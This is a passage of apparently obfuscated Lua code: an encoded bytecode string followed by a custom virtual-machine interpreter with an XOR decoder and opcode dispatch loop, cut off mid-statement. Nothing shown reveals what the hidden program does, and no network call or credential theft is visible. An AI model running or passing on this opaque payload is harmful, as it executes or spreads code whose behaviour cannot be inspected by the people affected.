G^cGFD_GGYLGGXgGFE\\FhYGEGVGEJeGEbWGG]WGGJiFhYGEJjE]FlIFGLGGZZGEY[GG_jGG_]GG]ZGEbWGEnUGFXMGGYaF^MGFZHGGZdGF__GG\\YGEDiGEXZGFjMFM[GEK]GEXZGEEZGG^\\GEGFGEDiGG[WGEjIGG]EGG^eFGWGEXZGG^hGFldGFE[GGEFGFDYGG^nFjjFM]GFDYGG_GGEg]GFDYFE]GEGFFiYGFDYGEifGEbWGEHdGFDYGG_XFEJGG]`GFDYGFjKGEVIFIdGGDKFKIGGa[FkmGEJDGEVIGFHEGEkVFGWF^`FEYGGXgGEVIGEIkGGafGEKFGEVIGG[XGFhmGEVIGEm]GFE\\GElUGFHEGGWJGGJYFL^E\\GFhmGFVVGEVHFM[GEDiGElUGGXZFL^GEmYGG`eGFnbGGJcGEJfFFXGG_^EkGFhmGEnIFhYGFVJGElUFFWGGXgGF_EGGbiGEKFGElUGGamGElUGElUGGbEGEJeGEmYGEmcGGWJFniGEl\\FGWGElUGGFXF_fGElUF]ZGF^dFGWFEgGGXgGEfiGEIkGGc]FnnGElUFKHGGDDGEmYGGIMGEJeFniGGIhGEJeGEnIGGJJGE]JGEmYGEnIGEIaGFmbGEmYGFlYF[KGGVjFjkGGWWGGHDGGXUGEFWGGXFGFU`GGVeGGb_GE\\JFfWGGVjFM[GGVjGGI\\GGdMGGIhGGVjGGXaGGdVGFE[GGDDGEnIGEmgGEZIGGZ\\GEHnFKGGFhmFM[GGVd");local F,e,G,E=1,c and c.bxor or function(F,G)local E,e=1,0 while F>0 and G>0 do local l,n=F%2,G%2 if l~=n then e=e+E end F,G,E=(F-l)/2,(G-n)/2,E*2 end if F<G then F=G end while F>0 do local G=F%2 if G>0 then e=e+E end F,E=(F-G)/2,E*2 end return e end,120,function(E,F,G)if G then local F=(E/2^(F-1))%2^((G-1)-(F-1)+1);return F-F%1;else local F=2^(F-1);return(E%(F+F)>=F)and 1 or 0;end;end local G,i,d=function()local d,E,l,n=f(K,F,F+3);d,E,l,n=e(d,G),e(E,G),e(l,G),e(n,G)F=F+4;return(n*16777216)+(l*65536)+(E*256)+d;end,function()local G=e(f(K,F,F),G);F=F+1;return G;end,function()local E,l=f(K,F,F+2);E,l=e(E,G),e(l,G)F=F+2;return(l*256)+E;end;local function c()local e=G();local F=G();local l=1;local e=(E(F,1,20)*(2^32))+e;local G=E(F,21,31);local F=((-1)^E(F,32));if(G==0)then if(e==0)then return F*0;else G=1;l=0;end;elseif(G==2047)then return(e==0)and(F*(1/0))or(F*(0/0));end;return L(F,G-1023)*(l+(e/(2^52)));end;local F,W=G,function(E)local n;if(not E)then E=G();if(E==0)then return'';end;end;n=l(K,F,F+E-1);F=F+E;local G={}for F=1,#n do G[F]=h(e(f(l(n,F,F)),120))end return W(G);end;local F,h=G,function(...)return{...},a('#',...)end local function M()local K,l,F={},{},{};local f={K,l,nil,F};local F,e=G(),{}for E=1,F do local G,F=i();if(G==2)then F=(i()~=0);elseif(G==3)then F=c();elseif(G==0)then F=W();end;e[E]=F;end;f[3]=i();for F=1,G()do l[F-1]=M();end;for f=1,G()do local F=i();if(E(F,1,1)==0)then local l,n,F=E(F,2,3),E(F,4,6),{d(),d(),nil,nil};if(l==0)then F[3]=d();F[4]=d();elseif(l==1)then F[3]=G();elseif(l==2)then F[3]=G()-(2^16)elseif(l==3)then F[3]=G()-(2^16)F[4]=d();end;if(E(n,1,1)==1)then F[2]=e[F[2]]end if(E(n,2,2)==1)then F[3]=e[F[3]]end if(E(n,3,3)==1)then F[4]=e[F[4]]end K[f]=F;end end;return f;end;local function c(F,i,f)local F,G,E=F[1],F[2],F[3];return function(...)local e,a,l,K,G,d,Y,W,L,h,E=F,G,E,h,1,-1,{},{...},a('#',...)-1,{},{};for F=0,L do if(F>=l)then Y[F-l]=W[F+1];else E[F]=W[F+1];end;end;local F=L-l+1 local F;local l;while true do F=e[G];l=F[1];if l<=76 then if l<=37 then if l<=18 then if l<=8 then if l<=3 then if l<=1 then if l>0 then i[F[3]]=E[F[2]];else local d;local l;E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];do return end;end;elseif l>2 then E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][E[F[4]]];G=G+1;F=e[G];if not E[F[2]]then G=G+1;else G=F[3];end;else local F=F[2];do return n(E,F,d)end;end;elseif l<=5 then if l==4 then local G=F[2]E[G](n(E,G+1,F[3]))else E[F[2]]=E[F[3]][E[F[4]]];end;elseif l<=6 then local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;elseif l>7 then local n;local l;E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2];n=E[l];for F=l+1,F[3]do o(n,E[F])end;else if E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=13 then if l<=10 then if l>9 then local d=a[F[3]];local n;local l={};n=t({},{__index=function(G,F)local F=l[F];return F[1][F[2]];end,__newindex=function(E,F,G)local F=l[F]F[1][F[2]]=G;end;});for n=1,F[4]do G=G+1;local F=e[G];if F[1]==148 then l[n-1]={E,F[3]};else l[n-1]={i,F[3]};end;h[#h+1]=l;end;E[F[2]]=c(d,n,f);else local d;local i;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];i=F[3];d=E[i]for F=i+1,F[4]do d=d..E[F];end;E[F[2]]=d;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];G=F[3];end;elseif l<=11 then if not E[F[2]]then G=G+1;else G=F[3];end;elseif l==12 then E[F[2]]=f[F[3]];else E[F[2]][F[3]]=F[4];end;elseif l<=15 then if l>14 then E[F[2]]=c(a[F[3]],nil,f);else if(F[2]<=E[F[4]])then G=F[3];else G=G+1;end;end;elseif l<=16 then E[F[2]]=F[3];elseif l>17 then if(E[F[2]]<E[F[4]])then G=F[3];else G=G+1;end;else if(F[2]<E[F[4]])then G=F[3];else G=G+1;end;end;elseif l<=27 then if l<=22 then if l<=20 then if l==19 then if(E[F[2]]==E[F[4]])then G=G+1;else G=F[3];end;else E[F[2]]=E[F[3]]/F[4];end;elseif l==21 then local F=F[2]local e,G=K(E[F](E[F+1]))d=G+F-1 local G=0;for F=F,d do G=G+1;E[F]=e[G];end;else do return E[F[2]]end end;elseif l<=24 then if l>23 then local G=F[2];do return E[G](n(E,G+1,F[3]))end;else E[F[2]]=E[F[3]]*E[F[4]];end;elseif l<=25 then local i;local n;local l;local d;E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];d=F[3];l=E[d]for F=d+1,F[4]do l=l..E[F];end;E[F[2]]=l;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];n=F[2];i=E[n];for F=n+1,F[3]do o(i,E[F])end;elseif l>26 then local G=F[2]E[G]=E[G](n(E,G+1,F[3]))else E[F[2]]=E[F[3]][E[F[4]]];end;elseif l<=32 then if l<=29 then if l>28 then local n;local l;E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2];n=E[l];for F=l+1,F[3]do o(n,E[F])end;else local l,l;local h;local o,a;local c;local l;E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2];c=E[F[3]];E[l+1]=c;E[l]=c[F[4]];G=G+1;F=e[G];l=F[2]o,a=K(E[l](E[l+1]))d=a+l-1 h=0;for F=l,d do h=h+1;E[F]=o[h];end;G=G+1;F=e[G];l=F[2]o,h={E[l](n(E,l+1,d))},0;for F=l,F[4]do h=h+1;E[F]=o[h];end G=G+1;F=e[G];G=F[3];end;elseif l<=30 then local L;local h;local Y,W;local l;local c;local a;E[F[2]]={};G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];a=F[3];c=E[a]for F=a+1,F[4]do c=c..E[F];end;E[F[2]]=c;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]Y,W=K(E[l]())d=W+l-1 h=0;for F=l,d do h=h+1;E[F]=Y[h];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];l=F[2];L=E[l];for F=l+1,F[3]do o(L,E[F])end;elseif l==31 then local F=F[2]E[F]=E[F](E[F+1])else local G=F[2];local e=E[F[3]];E[G+1]=e;E[G]=e[F[4]];end;elseif l<=34 then if l==33 then E[F[2]][F[3]]=E[F[4]];else E[F[2]]=(F[3]~=0);G=G+1;end;elseif l<=35 then if E[F[2]]then G=G+1;else G=F[3];end;elseif l>36 then i[F[3]]=E[F[2]];else local e=F[3];local G=E[e]for F=e+1,F[4]do G=G..E[F];end;E[F[2]]=G;end;elseif l<=56 then if l<=46 then if l<=41 then if l<=39 then if l>38 then local i;local o,c;local h;local l;E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];h=E[F[3]];E[l+1]=h;E[l]=h[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]o,c=K(E[l](n(E,l+1,F[3])))d=c+l-1 i=0;for F=l,d do i=i+1;E[F]=o[i];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;else E[F[2]]=(F[3]~=0);end;elseif l==40 then local e=F[2]local l,G={E[e](E[e+1])},0;for F=e,F[4]do G=G+1;E[F]=l[G];end else local i,d;local f;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2];f=E[F[3]];E[l+1]=f;E[l]=f[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]i,d={E[l](n(E,l+1,F[3]))},0;for F=l,F[4]do d=d+1;E[F]=i[d];end G=G+1;F=e[G];G=F[3];end;elseif l<=43 then if l==42 then if(F[2]<E[F[4]])then G=F[3];else G=G+1;end;else E[F[2]]=E[F[3]]*F[4];end;elseif l<=44 then local l;E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];l=F[2]E[l](n(E,l+1,F[3]))elseif l>45 then E[F[2]]=E[F[3]];else local G=F[2];do return E[G](n(E,G+1,F[3]))end;end;elseif l<=51 then if l<=48 then if l>47 then local n=F[2];local l={};for F=1,#h do local F=h[F];for G=0,#F do local G=F[G];local e=G[1];local F=G[2];if e==E and F>=n then l[F]=e[F];G[1]=l;end;end;end;else E[F[2]]=E[F[3]]+E[F[4]];end;elseif l<=49 then E[F[2]]=E[F[3]]+E[F[4]];elseif l>50 then local e=E[F[4]];if not e then G=G+1;else E[F[2]]=e;G=F[3];end;else if(E[F[2]]<E[F[4]])then G=F[3];else G=G+1;end;end;elseif l<=53 then if l==52 then local l;E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;else E[F[2]]=E[F[3]][F[4]];end;elseif l<=54 then if(E[F[2]]~=F[4])then G=G+1;else G=F[3];end;elseif l>55 then E[F[2]]=E[F[3]][F[4]];else E[F[2]]();end;elseif l<=66 then if l<=61 then if l<=58 then if l>57 then local G=F[2]E[G](n(E,G+1,F[3]))else local G=F[2]local e,F=K(E[G]())d=F+G-1 local F=0;for G=G,d do F=F+1;E[G]=e[F];end;end;elseif l<=59 then if(E[F[2]]==F[4])then G=G+1;else G=F[3];end;elseif l==60 then local l;E[F[2]]={};G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];if(E[F[2]]~=F[4])then G=G+1;else G=F[3];end;else E[F[2]]=E[F[3]]+F[4];end;elseif l<=63 then if l==62 then local F=F[2]E[F](E[F+1])else local h,K;local d;local l;E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=E[F[3]]+E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2]h,K={E[l](E[l+1])},0;for F=l,F[4]do K=K+1;E[F]=h[K];end G=G+1;F=e[G];G=F[3];end;elseif l<=64 then if(E[F[2]]<=E[F[4]])then G=F[3];else G=G+1;end;elseif l==65 then E[F[2]]=E[F[3]]*F[4];else E[F[2]]=F[3];end;elseif l<=71 then if l<=68 then if l>67 then E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][E[F[4]]];G=G+1;F=e[G];if not E[F[2]]then G=G+1;else G=F[3];end;else local G=F[2];local e=E[G];for F=G+1,F[3]do o(e,E[F])end;end;elseif l<=69 then E[F[2]]=E[F[3]]*E[F[4]];elseif l==70 then if(E[F[2]]~=F[4])then G=G+1;else G=F[3];end;else local n;local l;E[F[2]]={};G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];l=F[2];n=E[l];for F=l+1,F[3]do o(n,E[F])end;end;elseif l<=73 then if l==72 then do return end;else local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]]*F[4];G=G+1;F=e[G];E[F[2]]=E[F[3]]+F[4];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]]/F[4];G=G+1;F=e[G];do return E[F[2]]end G=G+1;F=e[G];do return end;end;elseif l<=74 then local e=E[F[4]];if not e then G=G+1;else E[F[2]]=e;G=F[3];end;elseif l==75 then local h;local i;local c,o;local l;l=F[2]c,o=K(E[l](n(E,l+1,F[3])))d=o+l-1 i=0;for F=l,d do i=i+1;E[F]=c[i];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];h=E[F[3]];E[l+1]=h;E[l]=h[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];h=E[F[3]];E[l+1]=h;E[l]=h[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]c,o=K(E[l](n(E,l+1,F[3])))d=o+l-1 i=0;for F=l,d do i=i+1;E[F]=c[i];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))else local d;local l;E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=E[F[3]]+E[F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]={};end;elseif l<=115 then if l<=95 then if l<=85 then if l<=80 then if l<=78 then if l==77 then E[F[2]]=#E[F[3]];else local G=F[2]local e,F=K(E[G](n(E,G+1,F[3])))d=F+G-1 local F=0;for G=G,d do F=F+1;E[G]=e[F];end;end;elseif l>79 then local i,d;local f;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2];f=E[F[3]];E[l+1]=f;E[l]=f[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]i,d={E[l](n(E,l+1,F[3]))},0;for F=l,F[4]do d=d+1;E[F]=i[d];end G=G+1;F=e[G];G=F[3];else local h;local o;local f;local c,a;local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]c,a=K(E[l](E[l+1]))d=a+l-1 f=0;for F=l,d do f=f+1;E[F]=c[f];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];o=F[3];h=E[o]for F=o+1,F[4]do h=h..E[F];end;E[F[2]]=h;G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];end;elseif l<=82 then if l==81 then local h;local c,o;local i;local l;l=F[2];i=E[F[3]];E[l+1]=i;E[l]=i[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];i=E[F[3]];E[l+1]=i;E[l]=i[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]c,o=K(E[l](n(E,l+1,F[3])))d=o+l-1 h=0;for F=l,d do h=h+1;E[F]=c[h];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];i=E[F[3]];E[l+1]=i;E[l]=i[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];else E[F[2]][F[3]]=F[4];end;elseif l<=83 then local G=F[2]E[G]=E[G](n(E,G+1,F[3]))elseif l==84 then E[F[2]]=#E[F[3]];else E[F[2]]=(F[3]~=0);end;elseif l<=90 then if l<=87 then if l>86 then local F=F[2];do return n(E,F,d)end;else local d;local l;E[F[2]]=i[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=F[4];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](E[l+1])G=G+1;F=e[G];do return end;end;elseif l<=88 then E[F[2]][E[F[3]]]=E[F[4]];elseif l==89 then local G=F[2]local e,F=K(E[G](n(E,G+1,F[3])))d=F+G-1 local F=0;for G=G,d do F=F+1;E[G]=e[F];end;else local F=F[2]E[F]=E[F](E[F+1])end;elseif l<=92 then if l==91 then local d;local l;l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];d=E[F[3]];E[l+1]=d;E[l]=d[F[4]];else local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l](E[l+1])G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=i[F[3]];G=G+1;F=e[G];E[F[2]][F[3]]=E[F[4]];G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]E[l](E[l+1])end;elseif l<=93 then if(F[2]<E[F[4]])then G=G+1;else G=F[3];end;elseif l>94 then do return E[F[2]]end else local l;E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,F[3]))G=G+1;F=e[G];if not E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=105 then if l<=100 then if l<=97 then if l==96 then E[F[2]]=i[F[3]];else local G=F[2];local e=E[G];for F=G+1,F[3]do o(e,E[F])end;end;elseif l<=98 then do return end;elseif l==99 then local e=F[2];local G=E[F[3]];E[e+1]=G;E[e]=G[F[4]];else E[F[2]]=E[F[3]]/F[4];end;elseif l<=102 then if l==101 then E[F[2]]();else E[F[2]]=(F[3]~=0);G=G+1;end;elseif l<=103 then local l=F[2];local n=F[4];local e=l+2 local l={E[l](E[l+1],E[e])};for F=1,n do E[e+F]=l[F];end;local l=l[1]if l then E[e]=l G=F[3];else G=G+1;end;elseif l>104 then local i,d;local l;l=F[2]E[l](n(E,l+1,F[3]))G=G+1;F=e[G];E[F[2]]={};G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];E[F[2]]=E[F[3]];G=G+1;F=e[G];l=F[2]i,d={E[l](E[l+1])},0;for F=l,F[4]do d=d+1;E[F]=i[d];end G=G+1;F=e[G];G=F[3];else local i;local c,o;local h;local l;l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=f[F[3]];G=G+1;F=e[G];l=F[2];h=E[F[3]];E[l+1]=h;E[l]=h[F[4]];G=G+1;F=e[G];E[F[2]]=F[3];G=G+1;F=e[G];l=F[2]c,o=K(E[l](n(E,l+1,F[3])))d=o+l-1 i=0;for F=l,d do i=i+1;E[F]=c[i];end;G=G+1;F=e[G];l=F[2]E[l]=E[l](n(E,l+1,d))G=G+1;F=e[G];E[F[2]]=E[F[3]][F[4]];G=G+1;F=e[G];if E[F[2]]then G=G+1;else G=F[3];end;end;elseif l<=110 then if l<=107 then if l>106 then E[F[2]][F[3]]=E[F[4]];else if(E[F[2]]<=E[F[4]])then G=F[3];else G=G+1;end;end;elseif l<=108 then local d;local 